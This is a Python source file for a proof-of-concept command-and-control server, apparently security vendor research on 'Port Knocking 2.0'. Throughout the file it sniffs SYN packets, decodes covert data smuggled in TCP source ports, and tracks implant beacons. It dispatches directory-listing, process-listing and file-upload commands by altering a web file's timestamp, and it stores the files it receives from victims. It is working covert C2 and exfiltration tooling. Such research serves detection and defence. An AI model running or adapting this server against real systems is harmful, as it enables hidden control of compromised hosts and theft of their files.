"""
    saucepot-server.py
    ~~~~~~~~~~~~~~~~~~

    A server controls clients that call back via ephemeral ports. The supported C2 features include:

        - Check-in / heartbeat
        - Directory listing
        - Process listing
        - File upload

    Note that this is a proof-of-concept of ephemeral port abusing along with source port knocking, coined 
    "Port Knocking 2.0". The implementation of C2 commands is limited, such as the lack of flexibility in 
    the 'ls' and 'upload' commands.

    :copyright: (c) 2023 Netskope Inc. All rights reserved.
    :author: Hubert Lin (July, 2023)
"""

import argparse
import base64
import json
import lzma
import os
import re
import struct
import threading
from datetime import datetime, timezone
from scapy.all import *

# Destination server and port to sniff the packet
dhost = '127.0.0.1'
dport = 80

# The acutal port the web server is running on
redir_port = 8088

# verbose output
verbosity = 0

# Port range for data transfer
start_port = 49000
end_port   = start_port + 256*60 -1

# data received during a c2 session
c2data = {}

# task_id of the c2 command to run
c2_task_id = 0

# Supported C2 features
c2_commands = [
    { 'nop': ['nop'] },
    { 'ls': ['ls', 'dir'] },
    { 'ps': ['ps'] },
    { 'upload': ['upload']}
]

# Port knocking sequences. All elements in a list must be unique
knocks = {
    'session-start': [32400, 32500, 32600],
    'session-end'  : [29900, 29800, 29700],
}

# file as a c2 command dispatcher
dispatcher = '/var/www/html/chk-version'

beacons = {}    # keep all callback info
stage = {}      # stage of command's port knocks
seq = {}        # sequence no. in TCP headers

def pkt_handler(pkt):
    """Translate the SrcPort values into knock sequences or C2 payloads."""
    global knocks
    global c2data
    global seq
    global verbosity

    sip = pkt[IP].src       # src ip
    sport = pkt[TCP].sport  # src port

    if not sip in seq.keys():
        seq[sip] = 0

    # Ignore the retransmitted packet
    if seq[sip] == pkt[TCP].seq:
        if verbosity >= 2:
            printmsg(f'Ignoring retransmitted packet from {sip}:{sport} seq {seq[sip]}')
        return

    # seq tracking by src IP
    seq[sip] = pkt[TCP].seq

    if not sip in stage.keys():
        # Index to track current stage of each knock sequence
        stage[sip] = {}
        for k in knocks.keys():
            stage[sip][k] = -1

    for k,sequences in knocks.items():
        seq_index = within_knock_sequences(sequences, sport)

        if seq_index >= 0:
            if seq_index - stage[sip][k] == 1:
                stage[sip][k] += 1
                if verbosity >= 1:
                    printmsg(f'Stage {stage[sip][k]+1} for "{k}" ({sip}:{sport})')
                if is_fully_knocked(k, sip):
                    if verbosity >= 1:
                        printmsg(f'Knock sequence "{k}" received from {sip}')

                    if k == 'session-start':
                        stage[sip]['session-end'] = -1
                        c2data[sip] = b''
                    elif k == 'session-end' and is_fully_knocked('session-start', sip):
                        stage[sip]['session-start'] = -1

                        try:
                            decompressed = lzma.decompress(c2data.get(sip, b'')).decode('utf-8')
                            c2info = json.loads(decompressed)
                            c2_event(c2info)
                        except lzma.LZMAError:
                            printmsg(f'[!] Error decompressing data. {len(c2data[sip])=}, {sip=}')
                        except json.JSONDecodeError as e:
                            printmsg(f'[!] Error json.loads(): {e} {decompressed}')

                continue
            elif is_partially_knocked(k, sip):
                stage[sip][k] = -1
                printmsg(f'Stage reset for "{k}" ({sip}:{sport})')
                continue
        elif is_partially_knocked(k, sip):
            stage[sip][k] = -1
            printmsg(f'Stage reset for "{k}" ({sip}:{sport})')
            continue

    if is_fully_knocked('session-start', sip) and start_port <= sport <= end_port:
            # Convert the source port value to actual data value
            data = (sport - start_port) % 256
            if verbosity >= 2:
                printmsg(f"Receiving data 0x{data:02x} ({data}) from {sip}:{sport}", stamp=False)
            c2data[sip] += struct.pack('B', data)


def within_knock_sequences(seqs:list, port:int, tolerance=3) -> int:
    """Check if the specified port is in the proximity of a knock sequence list"""
    for i in seqs:
        if abs(port - i) <= tolerance:
            return seqs.index(i)

    return -1


def is_fully_knocked(sequence_name:str, ip:str) -> bool:
    """Check if a specific knock sequence is fully received from specified IP"""
    global knocks
    global stage

    return True if stage[ip][sequence_name] == len(knocks[sequence_name])-1 else False


def is_partially_knocked(sequence_name:str, ip:str) -> bool:
    """Check if a specific knock sequence is partially received from specified IP"""
    global knocks
    global stage

    return True if 0 <= stage[ip][sequence_name] < len(knocks[sequence_name])-1 else False


def c2_event(data:dict):
    """C2 events handler"""
    global beacons
    global c2_task_id

    if data.get('id', 0):
        c2_command_dispatch('nop')

    if data['cmd'] == 'chkin':
        if data['payload']['uuid'] not in beacons:
            beacons[data['payload']['uuid']] = {**data['payload'],
                                                'first_seen': datetime.now(timezone.utc),
                                                'last_seen': datetime.now(timezone.utc)}
            printmsg(f"New beacon check-in:\n{json.dumps(data['payload'], indent=2)}")

        else:
            beacons[data['payload']['uuid']]['last_seen'] = datetime.now(timezone.utc)
            if verbosity >= 1:
                printmsg(f"Beacon check-in: {data['payload']['user']} @ {data['payload']['host']} ({data['payload']['ip']})")

    elif data['cmd'] == 'ps':
        printmsg(f"Process List ({data['host']}):\n{data['payload']}")

    elif data['cmd'] == 'ls':
        printmsg(f"Directory List ({data['host']}):\n{data['payload']}")

    elif data['cmd'] == 'upload':
        local_filename = f"data-{data['host']}-{data['uuid']}-{datetime.now(timezone.utc).strftime('%Y%m%d-%H%M%S')}.dat"

        with open(local_filename, 'wb') as f:
            f.write(base64.b64decode(data['payload'].encode('utf-8')))

        printmsg(f"Remote file {data['file']} @ {data['host']} received as {local_filename}")


def console_thread():
    """The console thread that handles user inputs"""
    global dport
    global redir_port
    user_input = ''

    c2_command_dispatch('nop')
    help()

    while not (user_input == 'exit' or user_input == 'quit' or user_input == 'q'):
        user_input = input('\nsaucepot > ')
        if user_input == 'help' or user_input == 'h':
            help()
        elif user_input == 'beacons' or user_input == 'b':
            list_beacons()
        else:
            c2_command_dispatch(user_input)

    os._exit(0)


def help():
    """Display help info"""
    help_info = '''\
Console commands:
    h, help      - Print help info
    b, beacons   - List called back beacons
    q, quit      - Quit this program

Beacon commands:
    ls, dir      - Directory list
    ps           - Process list
    upload       - Upload file to the c2 server
'''

    printmsg(help_info, stamp=False)


def list_beacons():
    """List called back beacons"""
    global beacons

    printmsg(f"{'UUID':<13} {'Hostname':<18} {'Username':<15} {'IP':<16} {'OS':<8} {'First Seen':<13} {'Last Seen':<13}", stamp=False)
    printmsg(f"{'':-<13} {'':-<18} {'':-<15} {'':-<16} {'':-<8} {'':-<13} {'':-<13}", stamp=False)
    for k in beacons.keys():
        printmsg(f"{k:<13} {beacons[k]['host']:<18} {beacons[k]['user']:<15} {beacons[k]['ip']:<16} "\
                 f"{beacons[k]['os']:<8} {beacons[k]['first_seen'].strftime('%b-%d %H:%M'):<13} "\
                 f"{beacons[k]['last_seen'].strftime('%b-%d %H:%M'):<13}", stamp=False)


def c2_command_dispatch(cmdline:str):
    """Manipulate the metadata of web content to dispatch the C2 command"""
    global dispatcher
    global c2_commands
    global c2_task_id

    if len(cmdline)==0:
        return

    idx = 0

    for cmd in c2_commands:
        for k,v in cmd.items():
            if cmdline in v:
                new_stamp = int(datetime.now(timezone.utc).timestamp())

                while new_stamp % len(c2_commands) != idx:
                    new_stamp -= 1

                # C2 command is dispatched in the last modified time of the dispatcher file
                c2_task_id = new_stamp
                os.utime(dispatcher, (c2_task_id, c2_task_id))
                if k != 'nop':
                    printmsg(f'Dispatching C2 command "{k}" as {c2_task_id} ("{datetime.fromtimestamp(new_stamp).strftime("%Y-%m-%d %H:%M:%S")}") ...')
                return
            else:
                continue
        idx += 1


def printmsg(msg:str, stamp=True):
    """Print messages with current timestamps prepended"""
    i = 0

    for line in msg.split('\n'):
        if i>0 or stamp==False:
            print(f'\n{line}', end='')
        else:
            print(f'\n[{datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")}] {line}', end='')
        i += 1


def check_ephemeral_port():
    """Check if the server sees the ephemeral port specified by the client"""
    global dport
    client_socket = None
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print(f'Ephemeral Port Checker listening on port {dport} ...')

    try:
        server_socket.bind(('0.0.0.0', int(dport)))
        server_socket.listen()
    except OSError as e:
        if 'Address already in use' in str(e):
            print(f'Bind failed: {e}')
            os._exit(1)
    except Exception as e:
        print(f'Exception: {e}')
        raise

    while True:
        try:
            client_socket, client_address = server_socket.accept()
            data = client_socket.recv(1024).decode('utf-8')
            # epoch with float point, down to the nanosecond
            match = re.search(r'^(duel_\d{10}\.\d{1,9})$', data)
            if match:
                challenge = match.group(1)
                printmsg(f'Challenge {challenge} received from {client_address[0]}:{client_address[1]}')
                client_socket.send(f'{challenge} {client_address[0]}:{client_address[1]} -> {client_socket.getsockname()[0]}:{client_socket.getsockname()[1]}\n'.encode())
        except KeyboardInterrupt as e:
            printmsg('Closing server socket ...')
            server_socket.close()
            os._exit(1)
        except Exception as e :
            continue

        if client_socket:
            client_socket.close()


def parse_args():
    global dhost
    global dport
    global verbosity

    parser = argparse.ArgumentParser()
    parser.add_argument('-d', '--dst',
                        default=dhost,
                        metavar='<destination_host>',
                        help='Destination host used in packet filter (default: %(default)s)')
    parser.add_argument('-p', '--port',
                        default=dport,
                        metavar='<destination_port>',
                        help='Destination port used in packet filter (default: %(default)s)')
    parser.add_argument('-v', '--verbose',
                        action='count',
                        default = 0,
                        help='Increase verbosity level (use multiple times for more verbosity)')
    parser.add_argument('-c', '--check',
                        action='store_true',
                        help='Check if the server sees the ephemeral port specified by the client')

    args = parser.parse_args()

    if args.dst:
        dhost = args.dst
    if args.port:
        dport = args.port
    if args.verbose:
        verbosity = args.verbose
    if args.check:
        check_ephemeral_port()
        os._exit(0)

    return args


def sniffer_thread():
    """The sniffer thread that handles ingress packets"""
    # SYN Packet filter in BPF syntax
    filter = f'tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack == 0 and dst host {dhost} and dst port {dport}'

    printmsg(f'Sniffing packets on interface {conf.iface} with filter "{filter}" ...')
    sniff(filter=filter, prn=pkt_handler, store=False)


def check_root():
    """Check if we have the root priv."""
    if os.geteuid() != 0:
        raise PermissionError("This script must be run as root.")

def main():
    global dhost
    global dport
    global filter
    threads = []

    parse_args()

    try:
        check_root()
    except PermissionError as e:
        print(e)
        os._exit(1)

    threads.append(threading.Thread(target=sniffer_thread, name='sniffer'))
    threads.append(threading.Thread(target=console_thread, name='console'))

    for t in threads:
        t.start()

    for t in threads:
        t.join()


if __name__ == "__main__":
    main()